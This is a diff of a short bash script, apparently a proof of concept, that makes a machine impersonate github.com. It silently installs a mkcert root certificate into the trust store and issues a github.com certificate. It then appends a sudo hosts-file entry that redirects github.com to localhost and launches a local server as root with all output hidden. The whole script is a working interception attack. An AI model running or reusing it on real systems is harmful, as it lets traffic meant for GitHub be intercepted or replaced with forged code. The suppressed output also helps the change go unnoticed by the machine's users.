@@ -1,13 +1,19 @@
 #!/bin/bash
 
-## Modify /etc/hosts
-echo "127.0.0.1      github.com #ThiSiSPoCIMP3rs0N4te" >> /etc/hosts
-
 ## Generate key for encryption + add them in cert trust store
 ## Could also be done with openssl (+ don't need to make the curl request)
 curl https://github.com/FiloSottile/mkcert/releases/download/v1.4.3/mkcert-v1.4.3-linux-amd64 -L -s -o mkcert && chmod +x mkcert
-./mkcert -key-file key.pem -cert-file cert.pem github.com localhost 127.0.0.1 ::1
+./mkcert -install&>/dev/null
+./mkcert -key-file key.pem -cert-file cert.pem github.com localhost 127.0.0.1 ::1 &>/dev/null
+
+#Restart your browser to take it into account
+
+## Modify /etc/hosts
+#echo "127.0.0.1      github.com #ThiSiSPoCIMP3rs0N4te" >> /etc/hosts
+echo '127.0.0.1 github.com #ThiSiSPoCIMP3rs0N4te' | sudo tee -a /etc/hosts  > /dev/null
 
 ## Launch http server
 ## Alternative w/o python { echo -ne "HTTP/1.0 200 OK\r\n\r\n"; cat some.file; } | nc -l -p 443
-python server.py &>/dev/null
+## Instead of subshell, could use screen to have no output
+(&>/dev/null sudo python3 server.py &)
+
